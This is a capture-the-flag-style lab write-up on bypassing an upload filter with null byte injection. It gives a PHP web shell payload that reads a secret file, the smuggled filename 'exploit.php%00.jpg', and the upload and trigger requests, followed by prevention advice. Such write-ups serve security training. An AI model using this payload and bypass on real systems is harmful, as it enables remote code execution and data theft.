# 🕵️ Web Shell Upload — Obfuscated File Extension via Null Byte Injection

## 🎯 Objective
- Exploit flawed filename validation to:
  - Bypass extension restrictions
  - Abuse null byte truncation
  - Upload executable PHP web shell
  - Achieve remote code execution
  - Extract sensitive data

---

## ❗ Why This Matters

- Filename validation flaws can:
  - Misinterpret true extensions
  - Be bypassed through encoding tricks
- Null byte injection remains dangerous where:
  - Validation and filesystem handling differ

---

## 🧪 Exercises Performed

# 🔍 Part 1 — Baseline Restriction Analysis

## 1️⃣ Direct PHP Upload Attempt

### Payload:

```php 
<?php echo file_get_contents('/home/carlos/secret'); ?>
````

---

### Result:

- ❌ Blocked

---

### Restriction:

```text 
Only JPG and PNG allowed
```

---

### Security Insight:

```text 
Server validates extension but mishandles encoded filename processing
```

---

# 🚀 Part 2 — Intercept Upload Request

## 2️⃣ Target Request

```http 
POST /my-account/avatar
```

---

### Goal:

- Manipulate filename parsing

---

# 🚀 Part 3 — Null Byte Extension Obfuscation

## 3️⃣ Filename Modification

### Original:

```http
filename="exploit.php"
```

---

### Malicious:

```http 
filename="exploit.php%00.jpg"
```

---

### Technique:

- ✔️ `%00` = URL-encoded null byte
- ✔️ Validation sees `.jpg`
- ✔️ Filesystem truncates at null byte

---

### Result:

- ✔️ Upload accepted
- ✔️ Stored as:

  ```text
  exploit.php
  ```

---

## ⚠️ Vulnerability Insight

```text 
Validation checks post-null extension, but storage truncates at null byte
```

---

# 🚀 Part 4 — Trigger Web Shell

## 4️⃣ Access Uploaded Payload

```http 
GET /files/avatars/exploit.php
```

---

### Outcome:

- ✔️ PHP executed
- ✔️ Carlos’s secret disclosed
- ✔️ Remote code execution achieved
- ✔️ Lab solved 🎉

---

## 🏁 Lab Completion

* Extension restrictions bypassed
* Null byte truncation exploited
* PHP shell uploaded
* Server-side execution achieved
* Sensitive data extracted

---

## 🧠 Key Takeaways

* Null byte attacks exploit parser inconsistencies
* Validation and storage must use identical normalization
* Encoding tricks remain effective
* Extension checks alone are insufficient
* Secure canonicalization is essential

---

## 🔥 Core Vulnerability

```text 
URL-encoded null byte in filename bypassed extension validation and enabled executable PHP upload
```

---

## 🛡️ Prevention

* Fully decode:

  * Filenames before validation
* Reject:

  * Null bytes
  * Encoded control characters
* Normalize:

  * Filenames consistently
* Rename:

  * Uploaded files server-side
* Store:

  * Outside executable paths
* Enforce:

  * Whitelists

---

## ⚠️ Security Principle

```text 
If validation sees one filename and storage sees another, attackers choose the real file
```

---

## 🏁 Status

- ✔️ Lab Completed
